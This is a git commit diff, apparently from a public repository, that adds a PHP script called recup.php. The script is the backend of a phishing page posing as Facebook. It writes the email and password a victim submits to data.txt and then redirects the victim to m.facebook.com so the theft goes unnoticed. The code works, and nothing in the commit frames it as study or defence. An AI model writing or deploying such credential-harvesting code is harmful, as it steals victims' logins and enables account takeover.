4c803ff892125e95b046dec98a252015a83d4e9e
satnin <110102854+satnin@users.noreply.github.com>
2022-07-28 01:06:37 +0200

    Add files via upload

--- recup.php
+++ recup.php
@@ -1,6 +1,17 @@
-<?php
+<pre>
 
-$fichier = fopen(data.txt, "a+");
-fwrite($fichier, $_POST[m_login_email]."|".$_POST[m_login_password]."\n");
+<?php
+//var_dump($_POST);
+//echo $_POST["email"];
+//echo $_POST["pass"];
+$fichier = fopen("data.txt", "a+");
+fwrite($fichier, $_POST["email"]."|".$_POST["pass"]."\n");
 fclose($fichier);
+header('Location:https://m.facebook.com');
+//echo 'Hello World'; echo 'Comment allez-vous ?'; echo 'Il fait beau non ?' 
+
+
 ?>
+
+
+</pre>
